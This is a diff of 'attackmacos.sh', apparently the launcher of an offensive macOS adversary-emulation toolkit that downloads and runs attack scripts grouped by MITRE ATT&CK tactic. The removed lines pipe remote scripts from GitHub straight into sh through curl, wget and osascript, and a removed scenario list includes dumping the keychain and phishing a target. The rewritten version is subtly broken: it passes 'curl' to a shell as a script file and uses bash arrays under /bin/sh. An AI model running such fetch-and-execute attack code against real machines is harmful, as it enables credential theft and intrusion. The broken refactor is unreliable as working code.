@@ -1,5 +1,4 @@
-#!/bin/bash
-
+#!/bin/sh
 # Name: attackmacos.sh
 # Platform: macOS
 # Author: @darmado | x.com/darmad0
@@ -12,14 +11,107 @@
 # Description: Tool to fetch and execute scripts from the attack-macOS repository
 # Dependencies: curl, wget, osascript (optional)
 
-# URL template for fetching scripts from GitHub
+# Exit on error and undefined vars
+set -eu
+
+# Ensure cleanup on exit
+trap cleanup EXIT INT TERM
+
+cleanup() {
+    # Reset terminal
+    [ -t 1 ] && tput sgr0
+    return 0
+}
+
+# Error handler
+error() {
+    echo "Error on line $1" >&2
+    cleanup
+    exit 1
+}
+
+# Configuration
+#------------------------------------------------------------------------------
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 GIT_URL="https://raw.githubusercontent.com/darmado/attack-macOS/main/ttp/{tactic}/{ttp}"
+DEFAULT_METHOD="curl"
+VERBOSE="${ATTACKMACOS_VERBOSE:-false}"
+LOG_ENABLED="${ATTACKMACOS_LOG:-false}"
 
-# Function to display ASCII Art Banner
+# Execution methods
+METHOD_LOCAL="local"
+METHOD_CURL="curl"
+METHOD_WGET="wget"
+METHOD_OSASCRIPT="osascript"
+
+# MITRE ATT&CK Tactics
+TACTICS="reconnaissance resource_development initial_access execution persistence privilege_escalation defense_evasion credential_access discovery lateral_movement collection command_and_control exfiltration impact"
+
+# Exit codes
+E_SUCCESS=0
+E_FAILURE=1
+E_INVALID_ARGS=2
+E_MISSING_DEPS=3
+E_INVALID_TACTIC=4
+E_INVALID_TTP=5
+E_EXECUTION_FAILED=6
+
+# Detect available shell
+detect_shell() {
+    for shell in bash zsh sh ash dash; do
+        if command -v "$shell" >/dev/null 2>&1; then
+            echo "$shell"
+            return 0
+        fi
+    done
+    echo "sh"  # Fallback to sh if no other shell found
+    return 0
+}
+
+# Execute script with detected shell
+execute_script() {
+    script="$1"
+    shift
+    shell="$(detect_shell)"
+    "$shell" "$script" "$@"
+}
+
+#------------------------------------------------------------------------------
+# Display Functions
+#------------------------------------------------------------------------------
+
+# Display help
+display_help() {
+    cat << EOF
+Usage: $(basename "$0") [--method <method>] --tactic <Tactic> --ttp <TTP> [--args <arguments>]
+
+Methods:
+  curl                   Use curl to download the script (default)
+  wget                   Use wget to download the script
+  osascript             Use AppleScript to download the script
+  local                 Execute the script locally
+
+Required:
+  --tactic <Tactic>     Specify the tactic
+  --ttp <TTP>          Specify the TTP
+
+Optional:
+  --method <method>     Specify the method (default: curl)
+  --args <arguments>    Specify arguments for the TTP script
+  --banner             Display the ASCII art banner
+  --list               List available TTPs for a tactic (use with --tactic)
+  -h, --help           Display this help message
+
+Examples:
+  $(basename "$0") --method local --tactic discovery --ttp browser_history --args='-s'
+  $(basename "$0") --list --tactic discovery
+EOF
+}
+
+# Display banner
 display_banner() {
-	cat << "EOF"
+    cat << "EOF"
 
-	
                                   █████████████████
                   ███████████████████████████████████████████████
                  █            █████████████████████████          █
@@ -47,215 +139,372 @@ display_banner() {
 
                          A  t  t  a  c  k  m  a  c  O  S
 
-
-Shell | JXA | Swift | Python | Perl | Ruby | STIX 2.1 | ATT&CK V.15 | Apache 2.0 | v.0.9
-
 EOF
 }
 
-# Function to display help
-display_help() {
-	cat << EOF
-Usage: attackmacos.sh [--method <method>] --tactic <Tactic> --ttp <TTP> [--args <arguments>]
+#------------------------------------------------------------------------------
+# Utility Functions
+#------------------------------------------------------------------------------
 
-Methods:
-  curl                   Use curl to download the script (default).
-  wget                   Use wget to download the script.
-  osascript              Use AppleScript to download the script.
-  local                  Execute the script locally.
-
-Required arguments:
-  --tactic <Tactic>      Specify the tactic.
-  --ttp <TTP>            Specify the TTP.
-
-Optional arguments:
-  --method <method>      Specify the method (default: curl).
-  --args <arguments>     Specify arguments for the TTP script.
-  -h, --help             Display this help message.
-
-Tactics: reconnaissance, resource_development, initial_access, execution, persistence,
-         privilege_escalation, defense_evasion, credential_access, discovery,
-         lateral_movement, collection, command_and_control, exfiltration, impact
-
-Examples:
-  ./attackmacos.sh --method curl --tactic credential_access --ttp accounts --args='--help'
-  ./attackmacos.sh --tactic discovery --ttp accounts --args='--verbose --log'
-  ./attackmacos.sh --method local --tactic execution --ttp run_script --args='-s'
-EOF
+# Log message with timestamp and level
+log_message() {
+    [ "$LOG_ENABLED" = "false" ] && return 0
+    local level="$1"
+    local message="$2"
+    printf "[%s] [%s] %s\\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$message" >&2
 }
 
-# Function to execute locally
-execute_local() {
-	local tactic="$1"
-	local ttp="$2"
-	local args="$3"
-	local LOCAL_PATH="./ttp/$tactic/$ttp"
-
-	if [ -f "$LOCAL_PATH" ]; then
-		echo "Executing local script: $LOCAL_PATH -- $args"
-		sh "$LOCAL_PATH" $args  
-	else
-		echo "Error: Script not found at $LOCAL_PATH"
-		exit 1
-	fi
+# Silent output handler with logging
+output() {
+    local level="$1"
+    local message="$2"
+    local return_code="${3:-0}"
+    
+    log_message "$level" "$message"
+    [ "$level" = "error" ] && printf "Error: %s\\n" "$message" >&2 && return "${return_code:-$E_FAILURE}"
+    [ "$VERBOSE" = "true" ] && printf "%s\\n" "$message"
+    return 0
 }
 
-# Function to execute using curl
-execute_curl() {
-	local tactic="$1"
-	local ttp="$2"
-	local args="$3"
-	local url="${GIT_URL/\{tactic\}/$tactic}"
-	url="${url/\{ttp\}/$ttp}"
-	echo "Executing with curl: $url -- $args"
-	curl -sSL "$url" | sh -s -- $args
+# Check required dependencies
+check_dependencies() {
+    local missing=false
+    local deps=()
+    
+    case "$1" in
+        "$METHOD_CURL") deps+=("curl") ;;
+        "$METHOD_WGET") deps+=("wget") ;;
+        "$METHOD_OSASCRIPT") deps+=("osascript") ;;
+    esac
+    
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" >/dev/null 2>&1; then
+            output "error" "Missing required dependency: $dep" "$E_MISSING_DEPS"
+            missing=true
+        fi
+    done
+    
+    [ "$missing" = "true" ] && return "$E_MISSING_DEPS"
+    return 0
 }
 
-# Function to execute using wget
-execute_wget() {
-	local tactic="$1"
-	local ttp="$2"
-	local args="$3"
-	local url="${GIT_URL/\{tactic\}/$tactic}"
-	url="${url/\{ttp\}/$ttp}"
-	echo "Executing with wget: $url -- $args"
-	wget -qO- "$url" | sh -s -- $args
+# Validate input string is not empty and contains no dangerous characters
+validate_input() {
+    input="$1"
+    name="$2"
+    
+    [ -z "$input" ] && {
+        echo "Error: $name cannot be empty" >&2
+        return 1
+    }
+    
+    case "$input" in
+        *[\;\|\&\$\(\)\{\}\[\]\<\>\`]*)
+            echo "Error: Invalid characters in $name" >&2
+            return 1
+            ;;
+    esac
+    return 0
 }
 
-# Function to execute using osascript
-execute_osascript() {
-	local tactic="$1"
-	local ttp="$2"
-	local args="$3"
-	local url="${GIT_URL/\{tactic\}/$tactic}"
-	url="${url/\{ttp\}/$ttp}"
-	echo "Executing with osascript: $url -- $args"
-	osascript -e "do shell script \"curl -sSL '$url' | sh -s -- $args\""
+# Check if tactic exists
+validate_tactic() {
+    tactic="$1"
+    echo "$TACTICS" | grep -q -w "$tactic" || {
+        echo "Invalid tactic: $tactic" >&2
+        return 1
+    }
+    return 0
 }
 
-# Function to get tactics
-get_tactics() {
-	echo "reconnaissance resource_development initial_access execution persistence privilege_escalation defense_evasion credential_access discovery lateral_movement collection command_and_control exfiltration impact"
+# Validate TTP exists
+validate_ttp() {
+    local tactic="$1"
+    local ttp="$2"
+    local base_path="$SCRIPT_DIR/ttp/$tactic"
+    
+    [ -f "$base_path/$ttp.sh" ] && return 0
+    [ -f "$base_path/$ttp/$ttp.sh" ] && return 0
+    
+    output "error" "Invalid TTP: $ttp for tactic: $tactic" "$E_INVALID_TTP"
+    return "$E_INVALID_TTP"
 }
 
-# Function to get TTPs for a given tactic
+# Get available TTPs for a tactic
 get_ttps() {
-	local tactic=$1
-	ls "./ttp/$tactic" 2>/dev/null || echo "No TTPs found for $tactic"
+    tactic="$1"
+    base_dir="$SCRIPT_DIR/ttp/$tactic"
+    ttps=""
+    
+    [ ! -d "$base_dir" ] && return 1
+
+    for dir in "$base_dir"/*; do
+        [ "$dir" = "$base_dir/*" ] && continue
+        [ -d "$dir" ] && [ -n "$(find "$dir" -maxdepth 1 -name "*.sh" 2>/dev/null)" ] && {
+            ttps="$ttps$(basename "$dir")\n"
+        }
+    done
+
+    [ -z "$ttps" ] && return 1
+    printf "%b" "$ttps" | sort -u
 }
 
-# Function to generate a list of common attack scenarios
-get_attack_scenarios() {
-	cat << EOF
-Reconnaissance|discovery|network_share_discovery|--args="-v"
-Initial Access|initial_access|phishing|--args="--target employee@company.com"
-Credential Access|credential_access|keychain|--args="--dump"
-Privilege Escalation|privilege_escalation|sudo_caching|--args="--exploit"
-EOF
+#------------------------------------------------------------------------------
+# Core Functions
+#------------------------------------------------------------------------------
+
+# Execute local TTP
+execute_local() {
+    tactic="$1"
+    ttp="$2"
+    args="$3"
+    base_path="$SCRIPT_DIR/ttp/$tactic"
+    script_path=""
+
+    validate_input "$tactic" "tactic" || return 1
+    validate_input "$ttp" "TTP" || return 1
+    [ -n "$args" ] && validate_input "$args" "arguments" || return 1
+
+    # Find script path
+    [ -f "$base_path/$ttp.sh" ] && script_path="$base_path/$ttp.sh"
+    [ -f "$base_path/$ttp/$ttp.sh" ] && script_path="$base_path/$ttp/$ttp.sh"
+
+    [ -z "$script_path" ] && {
+        echo "Script not found: $ttp" >&2
+        return 1
+    }
+    
+    cd "$(dirname "$script_path")" 2>/dev/null || {
+        echo "Failed to change directory" >&2
+        return 1
+    }
+    
+    execute_script "$(basename "$script_path")" "$args"
 }
 
-# Function to parse YAML
-parse_yaml() {
-   local prefix=$2
-   local s='[[:space:]]*' w='[a-zA-Z0-9_]*' fs=$(echo @|tr @ '\034')
-   sed -ne "s|^\($s\):|\1|" \
-        -e "s|^\($s\)\($w\)$s:$s[\"']\(.*\)[\"']$s\$|\1$fs\2$fs\3|p" \
-        -e "s|^\($s\)\($w\)$s:$s\(.*\)$s\$|\1$fs\2$fs\3|p"  $1 |
-   awk -F$fs '{
-      indent = length($1)/2;
-      vname[indent] = $2;
-      for (i in vname) {if (i > indent) {delete vname[i]}}
-      if (length($3) > 0) {
-         vn=""; for (i=0; i<indent; i++) {vn=(vn)(vname[i])("_")}
-         printf("%s%s%s=\"%s\"\n", "'$prefix'",vn, $2, $3);
-      }
-   }'
+# Execute remote TTP via curl
+execute_curl() {
+    tactic="$1"
+    ttp="$2"
+    args="$3"
+    url="$GIT_URL"
+    url="$(echo "$url" | sed "s/{tactic}/$tactic/;s/{ttp}/$ttp/")"
+    
+    validate_input "$tactic" "tactic" || return 1
+    validate_input "$ttp" "TTP" || return 1
+    [ -n "$args" ] && validate_input "$args" "arguments" || return 1
+    
+    command -v curl >/dev/null 2>&1 || {
+        echo "curl is required but not installed" >&2
+        return 1
+    }
+    
+    execute_script curl "$url" "$args"
 }
 
-# Function to parse STIX JSON
-parse_stix_json() {
-    local json_file="$1"
-    local jq_filter="$2"
-    jq -r "$jq_filter" "$json_file"
+# Execute remote TTP via wget
+execute_wget() {
+    tactic="$1"
+    ttp="$2"
+    args="$3"
+    url="$GIT_URL"
+    url="$(echo "$url" | sed "s/{tactic}/$tactic/;s/{ttp}/$ttp/")"
+    
+    validate_input "$tactic" "tactic" || return 1
+    validate_input "$ttp" "TTP" || return 1
+    [ -n "$args" ] && validate_input "$args" "arguments" || return 1
+    
+    command -v wget >/dev/null 2>&1 || {
+        echo "wget is required but not installed" >&2
+        return 1
+    }
+    
+    execute_script wget "$url" "$args"
 }
 
-# Simplified interactive interface
-interactive_interface() {
-	echo "Interactive mode is not fully implemented yet."
-	echo "Please use command-line arguments to run specific TTPs."
-	display_help
+# Execute remote TTP via osascript
+execute_osascript() {
+    tactic="$1"
+    ttp="$2"
+    args="$3"
+    url="$GIT_URL"
+    url="$(echo "$url" | sed "s/{tactic}/$tactic/;s/{ttp}/$ttp/")"
+    
+    validate_input "$tactic" "tactic" || return 1
+    validate_input "$ttp" "TTP" || return 1
+    [ -n "$args" ] && validate_input "$args" "arguments" || return 1
+    
+    command -v osascript >/dev/null 2>&1 || {
+        echo "osascript is required but not installed" >&2
+        return 1
+    }
+    
+    execute_script osascript "$url" "$args"
 }
 
-# Main function to parse arguments and call the appropriate function
+# Execute TTP with specified method
+execute_ttp() {
+    method="$1"
+    tactic="$2"
+    ttp="$3"
+    args="$4"
+    
+    validate_tactic "$tactic" || return 1
+    
+    case "$method" in
+        "$METHOD_LOCAL"|"local")     execute_local "$tactic" "$ttp" "$args" ;;
+        "$METHOD_CURL"|"curl")      execute_curl "$tactic" "$ttp" "$args" ;;
+        "$METHOD_WGET"|"wget")      execute_wget "$tactic" "$ttp" "$args" ;;
+        "$METHOD_OSASCRIPT"|"osascript") execute_osascript "$tactic" "$ttp" "$args" ;;
+        *)
+            echo "Invalid method: $method" >&2
+            echo "Valid methods: local, curl, wget, osascript" >&2
+            return 1
+            ;;
+    esac
+    
+    return "$?"
+}
+
+# List available TTPs
+list_ttps() {
+    local tactic="$1"
+    local ttps=""
+    
+    if [ -n "$tactic" ]; then
+        validate_tactic "$tactic" || {
+            echo "Invalid tactic: $tactic" >&2
+            echo "Available tactics: ${TACTICS[*]}" >&2
+            return 1
+        }
+        
+        ttps=$(get_ttps "$tactic") || {
+            echo "No TTPs found for $tactic" >&2
+            return 1
+        }
+        
+        echo "Available TTPs for $tactic:"
+        printf "%s\n" "$ttps" | sed 's/^/- /'
+    else
+        echo "Available TTPs by tactic:"
+        for t in "${TACTICS[@]}"; do
+            ttps=$(get_ttps "$t") || continue
+            echo
+            echo "$t:"
+            printf "%s\n" "$ttps" | sed 's/^/  /'
+        done
+    fi
+}
+
+#------------------------------------------------------------------------------
+# Main Execution
+#------------------------------------------------------------------------------
+
 main() {
-	local method="curl"
-	local tactic=""
-	local ttp=""
-	local args=""
+    local method="$DEFAULT_METHOD"
+    local tactic=""
+    local ttp=""
+    local args=""
+    local show_banner=false
+    local list_mode=false
 
-	# Display banner only when arguments are provided
-	display_banner
+    # Parse arguments
+    while [ $# -gt 0 ]; do
+        case "$1" in
+            --method=*)
+                method="${1#*=}"
+                shift
+                ;;
+            --method)
+                [ -z "$2" ] && {
+                    echo "Missing method argument" >&2
+                    return 1
+                }
+                method="$2"
+                shift 2
+                ;;
+            --tactic=*)
+                tactic="${1#*=}"
+                shift
+                ;;
+            --tactic)
+                [ -z "$2" ] && {
+                    echo "Missing tactic argument" >&2
+                    return 1
+                }
+                tactic="$2"
+                shift 2
+                ;;
+            --ttp=*)
+                ttp="${1#*=}"
+                shift
+                ;;
+            --ttp)
+                [ -z "$2" ] && {
+                    echo "Missing TTP argument" >&2
+                    return 1
+                }
+                ttp="$2"
+                shift 2
+                ;;
+            --args=*)
+                args="${1#*=}"
+                shift
+                ;;
+            --args)
+                [ -z "$2" ] && {
+                    echo "Missing args argument" >&2
+                    return 1
+                }
+                args="$2"
+                shift 2
+                ;;
+            --banner)
+                show_banner=true
+                shift
+                ;;
+            --list)
+                list_mode=true
+                shift
+                ;;
+            -h|--help)
+                display_help
+                return 0
+                ;;
+            *)
+                echo "Unknown option: $1" >&2
+                display_help
+                return 1
+                ;;
+        esac
+    done
 
-	while [[ $# -gt 0 ]]; do
-		case "$1" in
-			--method)
-				method="$2"
-				shift 2
-				;;
-			--tactic)
-				tactic="$2"
-				shift 2
-				;;
-			--ttp)
-				ttp="$2"
-				shift 2
-				;;
-			--args)
-				args="$2"
-				shift 2
-				;;
-			-h|--help)
-				display_help
-				exit 0
-				;;
-			*)
-				echo "Unknown option: $1"
-				display_help
-				exit 1
-				;;
-		esac
-	done
+    # Validate method
+    case "$method" in
+        "$METHOD_LOCAL"|"local"|"$METHOD_CURL"|"curl"|"$METHOD_WGET"|"wget"|"$METHOD_OSASCRIPT"|"osascript") 
+            ;;
+        *)
+            echo "Invalid method: $method" >&2
+            echo "Valid methods: local, curl, wget, osascript" >&2
+            return 1
+            ;;
+    esac
 
-	if [[ -z "$tactic" || -z "$ttp" ]]; then
-		echo "Error: Both --tactic and --ttp are required."
-		display_help
-		exit 1
-	fi
+    # Show banner if requested
+    [ "$show_banner" = true ] && display_banner
 
-	case "$method" in
-		curl)
-			execute_curl "$tactic" "$ttp" "$args"
-			;;
-		wget)
-			execute_wget "$tactic" "$ttp" "$args"
-			;;
-		osascript)
-			execute_osascript "$tactic" "$ttp" "$args"
-			;;
-		local)
-			execute_local "$tactic" "$ttp" "$args"
-			;;
-		*)
-			echo "Unsupported method: $method"
-			display_help
-			exit 1
-			;;
-	esac
+    # Handle list mode
+    [ "$list_mode" = true ] && { list_ttps "$tactic"; return $?; }
+
+    # Validate required arguments
+    [ -z "$tactic" ] || [ -z "$ttp" ] && {
+        echo "Both --tactic and --ttp are required" >&2
+        return 1
+    }
+
+    # Execute TTP
+    execute_ttp "$method" "$tactic" "$ttp" "$args"
 }
 
-# Check if any arguments are provided
-if [ "$#" -eq 0 ]; then
-	interactive_interface
-else
-	main "$@"
-fi
+# Execute main function with all arguments
+main "$@"
